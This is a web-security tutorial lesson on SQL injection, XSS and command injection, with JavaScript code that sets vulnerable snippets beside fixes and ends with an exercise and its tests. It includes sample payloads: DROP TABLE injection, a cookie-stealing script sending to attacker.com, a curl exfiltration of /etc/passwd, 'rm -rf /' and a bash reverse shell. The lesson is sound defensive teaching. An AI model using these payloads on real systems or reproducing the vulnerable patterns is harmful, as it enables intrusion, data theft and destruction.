---
series: web-security
level: 1
title: Injection — SQL, XSS, and Command Injection
lang: javascript
---

# Injection — SQL, XSS, and Command Injection

Injection vulnerabilities occur when untrusted data is sent to an interpreter (a database, a browser, a shell) as part of a command or query. The interpreter cannot tell the difference between data and code, so the attacker's data is executed as code.

Injection has been in the OWASP Top 10 since it was first published. It remains common because the insecure pattern is the intuitive one — building a SQL query by concatenating strings is the first approach any programmer thinks of. By the end of this lesson you will understand SQL injection, XSS, and command injection, and know the defences that eliminate each one.

## SQL Injection

SQL injection occurs when user input is concatenated directly into a SQL query. The attacker inputs SQL syntax that changes the meaning of the query.

```javascript
// VULNERABLE: user input concatenated into SQL
app.get('/users', async (req, res) => {
  const name = req.query.name   // attacker controls this value
  const query = `SELECT * FROM users WHERE name = '${name}'`
  const users = await db.query(query)
  res.json(users)
})
```

```text
ATTACK: SQL injection via the search parameter
URL: GET /users?name=' OR '1'='1

QUERY BECOMES:
  SELECT * FROM users WHERE name = '' OR '1'='1'
  
  '1'='1' is always true → returns ALL rows in the users table.
  Attacker gets: every user's email, password hash, personal data.

MORE DESTRUCTIVE ATTACK:
URL: /users?name='; DROP TABLE users; --

QUERY BECOMES:
  SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
  
  Drops the users table. All user data is permanently deleted.
  (The -- is a SQL comment — it comments out the trailing ' from the template.)

EVEN MORE TARGETED:
  UNION SELECT: attacker extracts data from OTHER tables
  Error-based: extracts data through database error messages
  Time-based blind: infers data by measuring response time
```

```javascript
// FIX: parameterised queries (prepared statements)
app.get('/users', async (req, res) => {
  const name = req.query.name   // still untrusted — but now handled safely
  // The ? is a parameter placeholder — the database driver handles escaping
  const users = await db.query(
    'SELECT * FROM users WHERE name = ?',
    [name]   // parameters passed separately — never concatenated
  )
  res.json(users)
})
```

```text
WHY PARAMETERISED QUERIES ARE SAFE:
  The query structure is fixed: 'SELECT * FROM users WHERE name = ?'
  The database parses the query structure BEFORE receiving the parameter.
  When the parameter arrives, it is treated as DATA, not as SQL code.
  No amount of SQL syntax in the name parameter can change the query structure.

  An attacker sending: '; DROP TABLE users; --
  Database sees it as: a literal string value to compare with name
  Result: no rows match the literal string '; DROP TABLE users; --'
  
PARAMETERISED QUERY RULES:
  ✓ Always use parameterised queries for ALL user-controlled data
  ✓ Use your database driver's placeholder syntax (?, $1, :name — depends on driver)
  ✓ Even "safe" inputs like integers and booleans should be parameterised
  ✗ NEVER string-concatenate user input into SQL, even with escaping
    (Escaping is insufficient — it can be bypassed with encoding tricks)
```

**CS lens:** The parameterised query pattern is an implementation of the **code/data separation** principle. SQL injection is possible because SQL is a language where data and code share the same string representation. Parameterised queries provide separate channels for code (the query template) and data (the parameters). The database driver ensures that parameters never reach the SQL parser — they are substituted after parsing, so they can only be values, never code. This is the same principle behind template literal tagging (sql\`...\`) in TypeScript ORMs.

## Cross-Site Scripting (XSS)

XSS occurs when untrusted data is included in an HTML page without proper encoding. The browser executes the injected script in the context of the page (with access to cookies, localStorage, and the DOM).

```javascript
// VULNERABLE: user input reflected directly into HTML
app.get('/search', (req, res) => {
  const query = req.query.q
  // If query is: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
  res.send(`
    <html>
      <body>
        <h2>Search results for: ${query}</h2>
        <!-- The script tag is rendered and executed by the browser -->
      </body>
    </html>
  `)
})
```

```text
XSS ATTACK TYPES:
  
  REFLECTED XSS (non-persistent):
    Attacker crafts a URL with malicious script in a parameter.
    Victim clicks the link. The server reflects the script back in the HTML.
    The browser executes it.
    Attack is in the URL — only affects users who click the malicious link.

  STORED XSS (persistent):
    Attacker posts malicious content (comment, profile name, post body).
    Server stores it in the database.
    When any user views the content: the script executes in their browser.
    Attack persists: every user who views the page is affected.
    Example: a comment containing <script>...</script> that is stored and displayed.

  DOM-BASED XSS:
    Malicious data from the URL is read and written to the DOM by client-side JavaScript.
    No server involvement — the client's own code creates the vulnerability.
    Example: document.write(location.hash) without encoding.

WHAT AN XSS SCRIPT CAN DO:
  → Steal session cookies: document.cookie (and send to attacker server)
  → Log keystrokes: record passwords typed after injection
  → Redirect to phishing sites
  → Perform actions as the victim: post comments, change settings, transfer funds
  → Cryptomine in the victim's browser
```

```javascript
// FIX: encode output for the context it appears in

// HTML encoding: for text content in HTML
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
}

app.get('/search', (req, res) => {
  const query = req.query.q
  res.send(`
    <html>
      <body>
        <h2>Search results for: ${escapeHtml(query)}</h2>
        <!-- Now the attacker's <script> becomes &lt;script&gt; — inert text -->
      </body>
    </html>
  `)
})
```

```text
XSS DEFENCES:
  
  SERVER-SIDE RENDERING:
    ✓ Encode all user data for the context: HTML (escapeHtml), JS (JSON.stringify),
      URL (encodeURIComponent), CSS (use CSS-specific encoding)
    ✓ Use a templating engine with auto-escaping (Handlebars, Jinja, EJS with <%=)
    ✗ NEVER use innerHTML with unsanitised user data

  CLIENT-SIDE (DOM):
    ✓ Set element.textContent = userInput (automatically encodes)
    ✗ NEVER: element.innerHTML = userInput (treats as HTML)
    ✗ NEVER: document.write(userInput)
    ✗ NEVER: eval(userInput)

  CONTENT SECURITY POLICY (HTTP header):
    Content-Security-Policy: default-src 'self'; script-src 'self'
    Blocks inline scripts and scripts from external origins.
    A CSP is a defence-in-depth measure — it does not replace output encoding.

  HttpOnly COOKIES:
    Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
    HttpOnly: JavaScript cannot read this cookie — XSS cannot steal it.
    This is why auth tokens should be HttpOnly cookies, not localStorage.
```

## Command Injection

Command injection occurs when user input is passed to a system shell command. The attacker injects shell metacharacters to run arbitrary commands on your server.

```javascript
// VULNERABLE: user input passed to a shell command
const { exec } = require('child_process')

app.post('/convert', (req, res) => {
  const filename = req.body.filename   // attacker-controlled
  // Intended: convert an image file
  exec(`convert ${filename} output.png`, (err, stdout) => {
    if (err) res.status(500).send(err)
    else res.send('Converted')
  })
})
```

```text
ATTACK:
  filename = "input.jpg; cat /etc/passwd > /tmp/stolen.txt; curl attacker.com < /tmp/stolen.txt"

  COMMAND BECOMES:
    convert input.jpg; cat /etc/passwd > /tmp/stolen.txt; curl attacker.com < /tmp/stolen.txt
    
  Result: the server's /etc/passwd is sent to the attacker's server.
  From there: escalate to reading environment variables (secrets), SSH keys, etc.

MORE DANGEROUS:
  filename = "$(rm -rf /)"     → deletes the entire filesystem
  filename = "x; bash -i >& /dev/tcp/attacker.com/4444 0>&1"  → reverse shell
```

```javascript
// FIX: use execFile() with explicit argument array (no shell)
const { execFile } = require('child_process')

app.post('/convert', (req, res) => {
  const filename = req.body.filename

  // Validate: only allow alphanumeric, -, _, and .
  if (!/^[a-z0-9_\-\.]+$/i.test(filename)) {
    return res.status(400).send('Invalid filename')
  }

  // execFile: does NOT invoke a shell — arguments are passed directly to the program
  // No shell metacharacters are interpreted
  execFile('convert', [filename, 'output.png'], (err) => {
    if (err) res.status(500).send(err)
    else res.send('Converted')
  })
})
```

**SE lens:** The pattern that prevents all three injection vulnerabilities is the same: **parameterisation / separation of code and data**. SQL: use `?` placeholders. HTML: use `textContent` or encoding functions. Shell: use `execFile` with a separate argument array, never `exec` with string concatenation. In each case, the interpreter receives code and data through separate channels, so it cannot confuse them. Wherever data is being interpolated into a command or document, ask: "Is this parameterised or concatenated?" If concatenated: it is vulnerable.

**Common mistakes:**
- "Safe" escaping instead of parameterisation — manually escaping SQL special characters is error-prone and can be bypassed with encoding tricks. Always use prepared statements; never escape and concatenate.
- Only encoding on output but not validating on input — encoding prevents display-level XSS, but stored XSS still enters the database. Validate input format AND encode output.
- Using `innerHTML` for performance with "safe" HTML — wrapping user content in `escapeHtml` then assigning to `innerHTML` is fragile. A future developer adds a path where `innerHTML` is used without escaping. Use `textContent` for user text; use a well-tested library for rendering sanitised HTML.

**Debug tip:** To test for XSS vulnerabilities: input `<script>alert('XSS')</script>` into every text field and URL parameter. If an alert pops up, you have a reflected or stored XSS vulnerability. For SQL injection: try `' OR '1'='1` in text fields that filter database results. A blank filter showing all results, or a database error message in the response, indicates vulnerability. Use automated scanners (OWASP ZAP, Burp Suite) to systematically test all inputs.

## Challenge: injection_defence

Implement safe versions of vulnerable functions.

```challenge
function buildSafeQuery(tableName, filters) {
  // tableName: MUST be from a whitelist — cannot be parameterised (table names can't be params)
  // filters: { [column]: value } — all values must be parameterised
  //
  // WHITELIST of valid table names: ['users', 'orders', 'products']
  // If tableName is not in the whitelist: throw Error('Invalid table name: X')
  //
  // Returns: { sql: string, params: any[] }
  //   sql: a parameterised query like 'SELECT * FROM users WHERE email = ? AND status = ?'
  //   params: the values in the same order as the ? placeholders
  //
  // Empty filters: return all rows ('SELECT * FROM tableName')
}

function safeHtmlText(str) {
  // Encodes str for safe insertion into HTML text content
  // Must encode: & < > " '
  // Returns the encoded string
}
```

```test
// buildSafeQuery: valid table, no filters
const q1 = buildSafeQuery('users', {})
assert q1.sql === 'SELECT * FROM users'
assert q1.params.length === 0

// buildSafeQuery: valid table with filters
const q2 = buildSafeQuery('orders', { status: 'pending', user_id: '42' })
assert q2.sql.includes('SELECT * FROM orders WHERE')
assert q2.sql.includes('status = ?')
assert q2.sql.includes('user_id = ?')
assert q2.params.includes('pending')
assert q2.params.includes('42')

// buildSafeQuery: invalid table name throws
let threw = false
try { buildSafeQuery('system_secrets', {}) } catch(e) {
  threw = true
  assert e.message.includes('Invalid table name')
}
assert threw

// safeHtmlText: encodes all dangerous characters
const encoded = safeHtmlText('<script>alert("XSS")</script>')
assert !encoded.includes('<')
assert !encoded.includes('>')
assert !encoded.includes('"')
assert encoded.includes('&lt;')
assert encoded.includes('&gt;')

// safeHtmlText: safe input is unchanged
assert safeHtmlText('Hello, world!') === 'Hello, world!'
```
